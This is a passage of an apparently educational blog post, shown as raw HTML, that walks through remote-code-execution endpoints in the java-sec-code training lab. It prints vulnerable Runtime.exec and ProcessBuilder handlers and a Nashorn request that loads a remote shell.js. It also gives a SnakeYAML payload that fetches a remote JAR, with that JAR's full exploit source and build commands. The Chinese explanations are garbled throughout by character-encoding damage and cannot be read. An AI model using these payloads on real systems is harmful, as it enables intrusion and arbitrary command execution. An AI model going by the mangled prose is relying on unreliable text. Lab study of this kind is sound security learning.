toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">11.</span> <span class="toc-text">ç›®å½•éå†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-path-traversal-vul"><span class="toc-number">11.1.</span> <span class="toc-text">1.&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">12.</span> <span class="toc-text">æ–‡ä»¶ä¸Šä¼ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file-upload"><span class="toc-number">12.1.</span> <span class="toc-text">1.&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-spel-vuln1"><span class="toc-number">13.1.</span> <span class="toc-text">1.&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-spel-vuln2"><span class="toc-number">13.2.</span> <span class="toc-text">2.&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">13.3.</span> <span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinseyy.github.io/2025/06/26/java-sec-code/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="åŒ—æ­Œ"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">java-sec-code<a class="post-edit-link" href="https://github.com/kinseyy/kinseyy.github.io/tree/master/2024/05/31/hello-world_posts/java-sec-code.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2025-06-26 20:58:52" itemprop="dateCreated datePublished" datetime="2025-06-26T20:58:52+08:00">2025-06-26</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2025-07-30 11:36:12" itemprop="dateModified" datetime="2025-07-30T11:36:12+08:00">2025-07-30</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">12k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">60m</span></span></span><span class="leancloud_visitors" id="/2025/06/26/java-sec-code/" data-flag-title="java-sec-code"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2025/06/26/java-sec-code/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">å­¦ä¹ ç¬”è®°</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/java/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">java</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>é¶åœºéœ€è®¿é—®<a target="_blank" rel="noopener" href="http://localhost:8080/index">http://localhost:8080/index</a></p>
<p>é»˜è®¤è´¦å·å¯†ç ä¸ºadmin admin123</p>
<p>é¢˜ç›®åœ¨æºç é‡Œï¼ˆäºæˆ‘æ‰¾åŠå¤©ï¼‰</p>
<p>ç”±äºåé¢ç¯å¢ƒæ˜¯dockerå¼€çš„ï¼Œè®¡ç®—å™¨å¯èƒ½å¼¹ä¸å‡ºæ¥</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-rce-runtime-exec"><a href="#1-rce-runtime-exec" class="headerlink" title="1. &#x2F;rce&#x2F;runtime&#x2F;exec"></a>1. &#x2F;rce&#x2F;runtime&#x2F;exec</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šé€šè¿‡è°ƒç”¨ <code>Runtime.getRuntime().exec(cmd)</code> æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤ï¼Œè¿™ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ¥æ‰§è¡Œè¯¥å‘½ä»¤ã€‚</p>
<p><strong>è¾“å…¥æµå¤„ç†</strong>ï¼šä½¿ç”¨ <code>BufferedInputStream</code> å’Œ <code>BufferedReader</code> ä»å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºæµä¸­è¯»å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚è¿™äº›ç»“æœä¼šè¢«ç´¯ç§¯åˆ°ä¸€ä¸ª <code>StringBuilder</code> ä¸­ã€‚</p>
<p><strong>å¼‚å¸¸æ•è·</strong>ï¼šå¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œæ•è·å¹¶è¿”å›å¼‚å¸¸çš„å­—ç¬¦ä¸²æè¿°ã€‚</p>
<p><strong>é€€å‡ºç å¤„ç†</strong>ï¼šåœ¨å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼Œæ£€æŸ¥å­è¿›ç¨‹çš„é€€å‡ºç ã€‚å¦‚æœé€€å‡ºç ä¸ä¸ºé›¶ä¸”ä¸º 1ï¼Œåˆ™è¡¨ç¤ºå‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚</p>
<p><strong>è¿”å›ç»“æœ</strong>ï¼šå¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œè¿”å›å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼›å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œåˆ™è¿”å›é”™è¯¯ä¿¡æ¯ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡Runtime.getRuntime()è¿™ä¸ªæ–¹æ³•æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¯¥ä»£ç é‡Œå®ƒé€šè¿‡ä¼ å…¥cmdå˜é‡è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png" alt="image-20241206200351163" loading="lazy"></p>
<h4 id="2-rce-ProcessBuilder"><a href="#2-rce-ProcessBuilder" class="headerlink" title="2.&#x2F;rce&#x2F;ProcessBuilder"></a>2.&#x2F;rce&#x2F;ProcessBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String[] arrCmd = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">           <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">           <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="keyword">return</span> e.toString();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼š <code>String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</code><br>é€šè¿‡ <code>ProcessBuilder</code> å¯åŠ¨ä¸€ä¸ªæ–°çš„ shell è¿›ç¨‹ï¼Œæ‰§è¡Œä¼ å…¥çš„å‘½ä»¤ <code>cmd</code>ã€‚è¿™é‡Œä½¿ç”¨ <code>-c</code> é€‰é¡¹å‘Šè¯‰ shell æ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„å‘½ä»¤ã€‚</p>
<p><strong>å¯åŠ¨è¿›ç¨‹</strong>ï¼š <code>Process p = processBuilder.start();</code><br>å¯åŠ¨è¿›ç¨‹åï¼Œè·å–è¯¥è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºæµå¹¶è¯»å–å…¶å†…å®¹ã€‚</p>
<p><strong>è¯»å–è¾“å‡º</strong>ï¼š é€šè¿‡ <code>BufferedInputStream</code> å’Œ <code>BufferedReader</code> é€è¡Œè¯»å–è¿›ç¨‹çš„è¾“å‡ºå¹¶å­˜å‚¨åœ¨ <code>StringBuilder</code> ä¸­ã€‚</p>
<p><strong>å¼‚å¸¸å¤„ç†</strong>ï¼š å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥æˆ–æŠ›å‡ºå¼‚å¸¸ï¼Œä¼šè¿”å›å¼‚å¸¸çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</p>
<p>è¯¥ä»£ç é€šè¿‡getè¯·æ±‚ä¼ å…¥ä¸€ä¸ªcmdï¼Œç„¶ååˆ©ç”¨ProcessBuilderè¿™ä¸ªç±»è°ƒç”¨ç³»ç»Ÿè¿›ç¨‹æ¥å‘½ä»¤æ‰§è¡Œ</p>
<p>æ³¨æ„ï¼Œåœ¨windowsç³»ç»Ÿé‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] arrCmd = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦åœ¨æºä»£ç ä¸­ä¿®æ”¹ï¼Œä¸ç„¶å‘½ä»¤æ‰§è¡Œä¼šæŠ¥é”™</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png" alt="image-20241206202436880" loading="lazy"></p>
<h4 id="3-rce-jscmd"><a href="#3-rce-jscmd" class="headerlink" title="3.&#x2F;rce&#x2F;jscmd"></a>3.&#x2F;rce&#x2F;jscmd</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ¥æ”¶ä¸€ä¸ªåä¸º <code>jsurl</code> çš„å‚æ•°ï¼›</p>
<p>ç„¶åä½¿ç”¨ Nashorn JavaScript å¼•æ“æ‰§è¡Œä¼ å…¥ URL æ‰€åŠ è½½çš„ JavaScript è„šæœ¬ã€‚</p>
<p>ç”±äºå‘½ä»¤æ— å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ¥é”™æ¥åˆ¤æ–­</p>
<p>shell.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/jscmd?jsurl=http://ip/shell.js</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png" alt="image-20250522213856792" loading="lazy"></p>
<p>è¯´ä¸å­˜åœ¨clac.exeï¼Œçš„ç¡®ä¸å­˜åœ¨ï¼Œè¿™è¯´æ˜å‘½ä»¤æˆåŠŸæ‰§è¡Œ</p>
<h4 id="4-rce-vuln-yarm"><a href="#4-rce-vuln-yarm" class="headerlink" title="4.&#x2F;rce&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;rce&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">     <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">     y.load(content);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>SnakeYaml</code>æ˜¯ç”¨æ¥è§£æyamlçš„æ ¼å¼ï¼Œå¯ä»¥ç”¨äºJavaå¯¹è±¡çš„åºåˆ—åŒ–ã€ååºåˆ—åŒ–ã€‚è¯¥ä»£ç åˆ©ç”¨SnakeYAMLå­˜åœ¨çš„ååºåˆ—åŒ–æ¼æ´æ¥rceï¼Œåœ¨è§£ææ¶æ„ yml å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œï¼Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬æ‰€åŠ è½½çš„yamlæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jaræ˜¯æˆ‘ä»¬è¿œç¨‹åŠ è½½çš„æ¶æ„æ–‡ä»¶ï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ•´ä¸ªè„šæœ¬ä¹Ÿéƒ½æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å®ç°äº†ScriptEngineFactoryæ¥å£ï¼Œç„¶åè°ƒç”¨Runtime.getRuntime().execæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>payloadé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>æ‰“åŒ…ä¸ºjar</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png" alt="image-20250525193848130" loading="lazy"></p>
<p>æ¼æ´ä¿®å¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="line">public void secYarm(String content) &#123;</span><br><span class="line">    Yaml y = new Yaml(new SafeConstructor());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-rce-groovy"><a href="#5-rce-groovy" class="headerlink" title="5.&#x2F;rce&#x2F;groovy"></a>5.&#x2F;rce&#x2F;groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

